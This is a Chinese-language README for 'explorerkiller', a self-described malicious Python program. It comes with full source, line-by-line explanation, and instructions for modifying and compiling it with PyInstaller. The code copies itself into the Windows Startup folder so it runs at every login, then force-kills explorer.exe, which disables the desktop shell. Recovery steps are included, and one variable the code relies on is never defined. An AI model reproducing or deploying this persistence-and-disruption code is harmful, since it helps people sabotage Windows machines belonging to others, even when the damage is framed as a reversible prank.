# 文件资源管理器杀手（explorerkiller）
## 简介
这是一个基于python制作并编译的恶意程序。
## 安全提醒
玩归玩，闹归闹，别拿设备开玩笑。假如你不小心（故意不小心）将此病毒运行，其造成的破坏是可以修复的，修复方法：  
1.打开任务管理器（Ctrl+Shift+Esc），运行“explorer.exe”  
2.调出运行菜单（Win+R），输入“shell:startup”并打开，找到本程序并删除文件
## 原理与代码详解
### 导入库
```
import os  
import shutil  
import sys  
import subprocess  
```
os，shutil和sys库：用于获取启动文件夹路径并复制  
subprocess:用于结束文件资源管理器进程  
### 复制到启动文件夹
```
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
```
获取系统的启动文件夹路径  
```
script_name = os.path.basename(sys.argv[0])
```
获取程序名称  
```
def is_file_in_startup_folder(startup_folder, file_name):
    return file_name in os.listdir(startup_folder)
```
定义检查文件是否存在函数    
```
def copy_self_to_startup(startup_folder, script_path, script_name):
    destination_path = os.path.join(startup_folder, script_name)
    shutil.copyfile(script_path, destination_path)
    print(f"Copied {script_name} to {destination_path}")
```
定义复制文件函数  
```
if is_file_in_startup_folder(startup_folder, script_name):
    print("The file is already in the startup folder.")
else:
    copy_self_to_startup(startup_folder, script_path, script_name)
```
调用检查文件和复制文件函数，检查是否已有文件，假如没有，复制程序  
### 结束文件资源管理器
```
subprocess.run(['taskkill','/im','explorer.exe','/f'])
```
## 其他参数
运行系统：windows10（后续会支持更多版本）  
编译器：pyinstaller v6.10.0  
python:3.13.0  
## 如何自己修改本程序并编译
1.下载并安装python  
2.下载本程序源码  
3.进行修改  
4.在终端切到程序所在路径，运行
```
pyinstaller -F 程序名称.py（请确认安装了pyinstaller）
```